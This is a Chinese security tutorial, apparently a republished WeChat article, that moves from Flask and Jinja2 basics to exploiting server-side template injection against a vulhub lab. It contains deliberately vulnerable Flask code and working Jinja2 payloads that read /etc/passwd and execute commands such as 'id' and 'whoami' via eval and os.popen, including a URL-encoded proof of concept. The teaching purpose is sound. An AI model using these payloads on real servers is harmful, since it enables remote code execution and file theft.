> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1gHvf7oOSVdHA00JkzwldQ)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

### Flask 简介

Flask 是一个 web 框架。也就是说 Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 wdb 应用程序可以使一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。Flask 属于微框架（micro-framework）这一类别，微架构通常是很小的不依赖于外部库的框架。这既有优点也有缺点，优点是框架很轻量，更新时依赖少，并且专注安全方面的 bug，缺点是，你不得不自己做更多的工作，或通过添加插件增加自己的依赖列表。Flask 的依赖如下：

*   Werkzeug 一个 WSGI 工具包
    
*   jinja2 模板引擎
    

Flask 简单易学，下面是 Flask 版的 hello world(hello.py):

```
app = Flask(__name__)
@app.route("/")
def hello():    
    return "Hello World!"
 
if __name__ == "__main__":
    app.run()
```

安装 Flask 即可运行了：

```
$ pip install Flask

$ python hello.py
* Running on http://localhost:5000/

*flask默认端口是5000
```

### Jinja2 简介

Jinja 2 是一种面向 Python 的现代和设计友好的模板语言，它是以 Django 的模板为模型的 Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 {{…}} 块 Jinja2 模板同样支持控制语句，像在 {%…%} 块中

```
{# This is jinja code   # 控制结构    {% for file in filenames %}        # 取值        {{ file }}    {% endfor %}#}
```

### Flask 框架学习

#### 最简单的 Flask 应用

```
from flask import Flaskapp = Flask(__name__)@app.route('/')def hello_world():    return "hello world!"    if __name__ == '__main__':    app.run()
```

代码作用：

1.  首先，导入 Flask 类。这个类的实例将会是我们的 WSGI 应用程序。
    
2.  接下来，创建一个该类的实例，第一个参数为应用模块或者包的名称。如果使用单一的模块，就需要使用 **name**，因为模块的名称将会因其作为单独应用启动还是作为模块导入而有不同（即'**main**'或实际的导入名）。只有这样，Flask 才能知道去哪找模版、静态文件等。
    
3.  然后使用 route() 装饰器告诉 Flask 什么样的 URL 才能触发函数。
    
4.  这个函数的名称也在生成 URL 的时候被特殊的函数采用，这个函数返回的就是我们想要显示在用户浏览器中的信息。
    
5.  最后使用 run() 函数来让应用运行在本地服务器上。其中 if **name** == '**main**': 确保服务器只会在该脚本被 Python 解释器直接执行的时候才会运行，而不是作为模块导入的时候。
    

#### 路由（装饰器）

1.  路由：@app.route()[app 是 Flask 的实例化对象，可以改变]
    
2.  作用：Flask 通过装饰器来识别用户需要访问的网址路径，并在对应的路径做出对应的操作。例如上述代码，当访问到 "xxxxxx/" 时，装饰器会触发 [hello_world()] 函数，从而在访问该 URL 时得到 "Hello World！"
    
3.  例如：
    

```
@app.route('/')def index():    return 'This is index page'//当访问"/"时显示"This is index page"@app.route('/hello')def hello():    return 'Hello World'//当访问"/hello"时显示"Hello World"
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkFicMo0lkKqCibCs9BlEibJQXpgBfYSuTKTHZqRicOELsFmT6oEsfFjVWSw/640?wx_fmt=jpeg)

总结：route() 装饰器就是把一个函数绑定在一个 URL 上，不仅如此，还可以构造含有动态部分的 URL, 也可以在一个函数上附着多个规则。  

#### 变量规则

1.  <> 定义路由的变量参数，<> 需要起个名字。
    
2.  注意：参数类型默认是字符串，使用 unicode 编码。
    
3.  给 URL 添加变量部分，可以把这些特殊字段标记为 <var_name（自定义）>，这个部分将会作为参数传入到下面的函数中，并支持使用 converter:var_name 来进行转换。
    
4.  例如，需要注意的是，需要在函数的括号内输入变量名，后面的代码才可以正常运行：
    

```
@app.route('/hello/<user_name>')def user(user_name):    return 'User: %s ' %user_name        @app.route('/index/<int:id>')def ID(id):    return 'ID:%d' %id
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkAtq7OiccGyoGjypE9uJOibVNSjjGr37O5YNNqa0zjGmcnJXY5oZUzsTw/640?wx_fmt=png)

#### 路由请求方式限定

1.  通过修改 route() 装饰器的 methods 参数可以改变路由对于服务器的请求方式（默认为 GET）
    
2.  例如
    

```
@app.route('/',methods=['GET','POST'])def index():    return "GET/POST"
```

通过修改 methods 参数，通过'GET'和'POST'方法都可以对指定 URL 进行访问。

#### 关于 Jinja2 模版引擎

1.  模板：模板就是一个包含响应文本的文件，其中用占位符（变量）表示动态部分，告诉模板引擎其具体的值是需要从使用的数据中获取的。
    
2.  渲染：使用真实值来替换变量，在返回最终得到的字符串。Flask 的渲染方法有 render_template 和 render_template_string 两种。render_template() 是用来渲染一个指定的文件的。使用如下`return render_template('index.html')`render_template_string 则是用来渲染一个字符串的。SSTI 与这个方法密不可分。使用方法如下
    

```
html = '<h1>This is index page</h1>'return render_template_string(html)
```

3.  返回一个模板文件。Flask 是使用 Jinja2 来作为渲染引擎的。在网站的根目录下新建 templates 文件夹，这里是用来存放 html 文件。也就是模板文件。
    

```
from flask import Flask,url_for,redirect,render_template,render_template_string@app.route('/index/')def user_login():    return render_template('index.html')
```

访问 127.0.0.1:5000/index / 的时候，flask 就会渲染出 index.html 的页面。模板文件并不是单纯的 html 代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。例如：

```
from flask import Flask,url_for,redirect,render_template,render_template_string@app.route('/index/')def user_login():    return render_template('index.html',content='This is index page.')
```

/templates/index.html

```
<h1>{{content}}</h1>
```

4.  例如：
    

```
@app.route('/')def index():    return render_template('index.html')    if __name__ == '__main__':    app.run()
```

这个时候页面仍然输出 This is index page。

render_template() 函数对模板进行渲染，第一个参数一定是模板的名称，之后的参数可以为模板中的变量代码块传递值，这个参数可以是整数、字符串、浮点数、字段、列表、函数等等。值得注意的是，后面的参数都使用键值对的形式，表示模板中对应变量的真实性。"index.html" 是模板文件的名称，它是 templates 文件夹下的一个文件。

#### 模板中的代码块

1.  变量代码块
    

1.  变量使用双层大括号 ({{var_name}}), 这就是变量代码块。
    
2.  注释：使用 {# #} 进行注释，如{#{{var_name}}#}
    

3.  控制代码块 使用 {%  %} 来定义控制代码块，可以实现一些逻辑功能，比如循环或者条件。
    

比如：

```
{?  if (条件) ?}代码
```

### 服务器端模板注入 SSTI

#### 什么是服务器端模板注入？

服务器端模板注入是指攻击者能够使用本机模板语法将恶意有效负载注入模板中，然后在服务器端执行该模板。

模板引擎旨在通过将固定模板与易失性数据结合来生成网页。当用户输入直接连接到模板中而不是作为数据传递时，可能会发生服务器端模板注入攻击。这使攻击者可以注入任意模板指令以操纵模板引擎，从而经常使攻击者能够完全控制服务器。顾名思义，服务器端模板注入有效载荷是在服务器端交付和评估的，这可能使它们比典型的客户端模板注入更加危险。

#### 服务器端模板注入有什么影响？

服务器端模板注入漏洞可能使网站受到各种攻击，具体取决于所讨论的模板引擎以及应用程序使用它的方式。在某些罕见情况下，这些漏洞不会带来真正的安全风险。但是，在大多数情况下，服务器端模板注入的影响可能是灾难性的。

在规模最大的时候，攻击者可以潜在地实现远程代码执行，从而完全控制后端服务器，并使用它对内部基础结构进行其他攻击。

即使在无法完全执行远程代码的情况下，攻击者通常仍可以使用服务器端模板注入作为其他众多攻击的基础，从而有可能获得对服务器上敏感数据和任意文件的读取权限。

#### 服务器端模板注入漏洞如何产生？

当用户输入被串联到模板中而不是作为数据传递时，服务器端模板注入漏洞就会出现。简单来说也就是不正确的使用 flask 中的 render_template_string 方法会引发 SSTI。仅提供占位符并在其中呈现动态内容的静态模板通常不容易受到服务器端模板注入的攻击。经典示例是一封电子邮件，其中用每个用户的名字打招呼，例如 Twig 模板中的以下摘录：

```
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```

这不易受到服务器端模板注入的影响，因为用户的名字仅作为数据传递到模板中。

但是，由于模板只是字符串，因此 Web 开发人员有时会在呈现之前将用户输入直接连接到模板中。让我们以与上述示例类似的示例为例，但是这次，用户可以在发送电子邮件之前自定义部分电子邮件。例如，他们也许可以选择使用的名称：

```
$output = $twig->render("Dear " . $_GET['name']);
```

在此示例中，不是将静态值传递到模板中，而是使用 GET 参数动态生成模板本身的一部分 name。在服务器端评估模板语法时，这可能使攻击者可以按以下方式将服务器端模板注入有效负载放置在 name 参数中：`http://vulnerable-website.com/?name={{bad-stuff-here}}`这类漏洞有时是由于不熟悉安全隐患的人对模板的不良设计导致的，也有的是有意实施的。例如，某些网站故意允许某些特权用户（例如内容编辑器）通过设计来编辑或提交自定义模板。如果攻击者能够利用这种特权来破坏帐户，则显然会带来巨大的安全风险。

#### 构建服务器端模板注入攻击

确定服务器端模板注入漏洞并成功进行攻击通常涉及以下过程。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkOxNe7R7Yn8ib0tv6kvPqpFvVxy19zCpJENAhYicLtlFmv9iamjPic8RfHw/640?wx_fmt=png)

##### 检测

最简单的初始方法是通过注入模板表达式中常用的特殊字符序列来使模板模糊，例如`${{<%[%'"}}%\`。如果引发异常，则表明服务器可能以某种方式解释了注入的模板语法。这表明服务器端模板注入可能存在漏洞。

通过将数学运算设置为参数的值，我们可以测试这是否也是服务器端模板注入攻击的潜在入口点。例如，考虑一个包含以下易受攻击的代码的模板：

```
render('Hello ' + username)
```

我们还可能会通过请求 URL 来测试服务器端模板的注入，例如：`http://vulnerable-website.com/?username=${7*7}`如果结果输出包含 Hello 49，则表明正在服务器端评估数学运算。这是服务器端模板注入漏洞的良好概念证明。请注意，成功评估数学运算所需的特定语法将根据所使用的模板引擎而有所不同。

在其他情况下，该漏洞是通过将用户输入放置在模板表达式中来暴露的，就像我们之前在电子邮件示例中看到的那样。这可以采用将用户可控制的变量名放置在参数中的形式，例如：

```
greeting = getQueryParameter('greeting')engine.render("Hello {{"+greeting+"}}", data)
```

在网站上，生成的 URL 类似于：`http://vulnerable-website.com/?greeting=data.username`例如，这将在输出到中呈现 Hello Carlos。

实际在测试过程中，很容易就会忽略这个问题。因为它不会导致明显的 XSS，并且与简单的哈希映射查找几乎没有区别。在这种情况下，测试服务器端模板注入的一种方法是，通过将任意 HTML 注入到值中，首先确定该参数不包含直接 XSS 漏洞：`http://vulnerable-website.com/?greeting=data.username<tag>`

在没有 XSS 的情况下，这通常会导致输出中出现空白条目（只是 Hello 没有用户名），编码的标签或错误消息。下一步就是尝试使用通用模板语法突破该语句，并尝试在其后注入任意 HTML：`http://vulnerable-website.com/?greeting=data.username}}<tag>`如果这又导致错误或输出空白，则说明使用了错误的模板语言提供的语法；如果没有模板样式的语法，则无法进行服务器端模板注入；如果输出和任意 HTML 一起正确呈现，则这表明存在服务器端模板注入漏洞：`Hello Carlos<tag>`

##### 确定模版引擎

一旦发现存在模板注入，下一步就是确定模版引擎。尽管存在大量的模板语言，但其中许多模板使用非常相似的语法，这些语法是专门为不与 HTML 字符冲突而选择的。结果，创建探测有效载荷以测试正在使用哪个模板引擎可能相对简单。通常只需提交无效的语法就足够了，因为产生的错误消息将准确告诉您模板引擎是什么，有时甚至是哪个版本。例如，无效表达式 <%=foobar%> 会触发基于 Ruby 的 ERB 引擎的以下响应：

```
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'from -e:4:in `<main>'
```

常用的方法是使用来自不同模板引擎的语法注入任意数学运算。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkNngMJastvymKQqw08syYfmy7wU5gMarp4o9vKn3Xhcs0U2gcPic4XCQ/640?wx_fmt=jpeg)

### SSTI 漏洞  

首先来看一个简单的例子：

```
from flask import Flask,render_template_string,requestapp = Flask(__name__)@app.route('/test/')def test():    code = request.args.get('id')   //get方式获取id    html = '''        <h3>%s</h3>    '''%(code)    return render_template_string(html)app.run()
```

访问页面后，输入 id=1

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkn3ElaH5ickHXiaRy44BwA7Bfgiaic74cFCE9EzNXJMlBx9j1HA4jiaAKVLg/640?wx_fmt=png)

然后输入简单的 XSS 查看效果

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkBf5oIykkejvVrxK2FibNzdoVReMfJGjfFWaFQ4l0K5W546XXibw3mib5Q/640?wx_fmt=png)

造成了 XSS 攻击。

现在将代码进行修改

```
from flask import Flask,render_template_string,requestapp = Flask(__name__)@app.route('/test/')def test():    code = request.args.get('id')    html = '''        <h3>{{code}}</h3>    '''    return render_template_string(html,code=code)app.run()
```

再次输入 XSS 脚本查看效果

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkbkJXcWnVqqicOZicsxVHeLYbGwHEibmBdibttbicIZITxlnB9lLvxCw7H1A/640?wx_fmt=png)

发现被直接输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在 xss 了。在这段代码中用户所控的是 code 变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。

再来看一个例子：

```
from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route("/")def index():    name = request.args.get('name', 'guest')    t = Template("Hello " + name)    return t.render()if __name__ == "__main__":    app.run()
```

看到 Template("Hello"+name)，因为是 Jinja2，所以参数方式为 {{}}，并且 Template() 完全可控。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmk7icpsV1uIdJBLB7lTb1Iv4icYGe1QopqoGkoPgalsk7DScmgMvx1icQyw/640?wx_fmt=png)

不过这个问题也并非是 Jinja2 的问题，而且在编写的过程中出现的。如果修改为下面这种，就不存在模板注入了。

```
from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route("/safe")def safe():    name = request.args.get('name', 'guest')    t = Template("Hello {{n}}")    return t.render(n=name)if __name__ == "__main__":    app.run()
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmknhW0cAicNzYfuRSVsaKhw00PbIZVNrnhia2h8iauyWV0nj04pjXgI7KEg/640?wx_fmt=jpeg)

在 Jinja2 中是可以直接访问 python 的一些对象及其方法的，如 字符串对象及其 upper 函数，列表对象及其 count 函数，字典对象及其 has_key 函数, 那么怎么能够在 Jinja2 模板中访问到 Python 中的内置变量并且可以调用对应变量类型的方法，这就使用到了 Python 沙盒逃逸。  

其中 Python 的特性有：

```
__base__ 以元组返回一个类直接所继承的类__mro__ 以元组返回继承关系链__class__ 返回对象所属的类__globals__ 以dict返回函数所在模块命名空间中的所有变量__subclasses__() 以列表返回类的子类__init__  类的初始化方法_builtin_ 内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__) ps：在py3中__builtin__被换成了builtin  __builtin__ 和 __builtins__之间是什么关系呢？在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
```

如果使用 file 对象读取文件，不能像字符串、列表一样直接进行引用，就需要使用 Python 的属性和方法。比如：

```
for c in {}.__class__.__base__.__subclasses__():    if(c.__name__=='file'):        print(c)        print c('test.txt').readlines()
```

这段代码，就是从列表获取到类，再取基类 (object)，再取 object 中的所有子类，再从子类中寻找 file 类，找到使用其构造方法创建对象后再用 readlines 读取文件内容。

用 Jinja2 的语法：

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='file' %}{{"find!"}}{{ c("/etc/passwd").readlines() }}{% endif %}{% endfor %}
```

使用简单的代码进行测试

```
from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route('/test/')def test():    code = request.args.get('id')    html = '''        <h3>%s</h3>    '''%(code)    return render_template_string(html)if __name__ == "__main__":    app.run()
```

构造参数 {{22*33}}

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmk6TQhBj3F0qgafvwEmy8zia4FmFIgUadNUOAzstqQ6iccksAmF8zFXLUA/640?wx_fmt=jpeg)

可以看到表达式被执行了。  

另外在 Flask 中也有全局变量。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmk2498xMq8y8HN98DvfCdmpeonnrwuGIba03tTRelanJmIibIYoDL2Mbw/640?wx_fmt=png)

接下来看一下是如何获取到的，是一个怎么样的过程。1、获取字符串的类对象

```
>>> ''.__class__<type 'str'>
```

2、寻找基类

```
>>> ''.__class__.__mro__(<type 'str'>, <type 'basestring'>, <type 'object'>)
```

3、寻找可用饮用

```
>>> ''.__class__.__mro__[2].__subclasses__()[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```

4、加以利用

```
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
```

这里使用 vulhub 进行测试。

查看一下 app.py 的源码

```
from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route("/")def index():    name = request.args.get('name', 'guest')    t = Template("Hello " + name)    return t.render()if __name__ == "__main__":    app.run()
```

获取 eval 函数执行任意代码 vulhub 上的 ssti 文档直接给出了获取 eval 函数并执行任意 python 代码的 poc

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("id").read()') }}    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}
```

简单的看一下代码，其实如果单写 if&for 语句，就好理解了。

```
{% if user %}     Hello,{{user}} !{% else %}     Hello,Stranger!{% endif %}
```

```
<ul>     {% for comment in comments %}         <li>{{comment}}</li>     {% endfor %}</ul>
```

寻找方法：寻找 **builtins** 得到 eval

```
for c in ().__class__.__bases__[0].__subclasses__():    try:        if '__builtins__' in c.__init__.__globals__.keys():            print(c.name)    except:        pass
```

脚本不知道什么原因运行后也没有回显，如果各位大佬知道的话请教教小弟 qwq 找到了一个 python2/3 都有 **builtins** 的类 _IterationGuard。

找到 python2/3 通用的执行任意代码

```
for c in ().__class__.__bases__[0].__subclasses__():    if c.__name__=='_IterationGuard':        c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
```

运行后：

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkicHJvpcbKnzn0gX2cTm2gGsVhibpvgdQBSCic13FwJtZwAKq7Belvlzyg/640?wx_fmt=jpeg)

用 jinja 的语法即为（执行命令使用 os.popen('whoami').read() 才有执行结果的回显）  

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_IterationGuard' %}{{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
```

不过需要注意的时，最好将 POC 转化为 URL。

```
?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUruwUajvG7IGKWLVH4bPmkrnxplXbn3FPUWTBjR9pREcMg4MibDiaibCq6ibhmJPR8KPp9Csz9arVowA/640?wx_fmt=jpeg)

不过关于 SSTI 最多的还是与 Python 沙盒逃逸相关，尤其是在相关比赛中。 关于沙盒逃逸和 CTF 中常见的问题，将在下一篇文章中总结。  

### 参考（感谢大佬们的精彩文章）：

```
从零学习flask模板注入——https://www.freebuf.com/column/187845.html
flask ssti漏洞复现——https://www.jianshu.com/p/a1d6ae580add?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation
Flask（Jinja2） 服务端模板注入漏洞(SSTI)——https://my.oschina.net/u/4292797/blog/3683392
Server-side template injection——https://portswigger.net/web-security/server-side-template-injection
Exploiting server-side template injection vulnerabilities
——https://portswigger.net/web-security/server-side-template-injection/exploiting
Flask（Jinja2）服务端模板注入漏洞——vulhub/flack/ssti——https://blog.csdn.net/qq_45625605/article/details/102837747
```

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室，近三年来在网络安全技术方面开展研发项目 60 余项，获得各类自主知识产权 30 余项，省市级科技项目立项 20 余项，研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。对安全感兴趣的小伙伴可以加入或关注我们。

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RX4MU7S4WB8R6vF3JbUjA7K0ZtOPxqGSo1HGPhTDicQibOro93UYNBOwRPd4EFseGTDsl1tan0ZXcmw/640?wx_fmt=gif)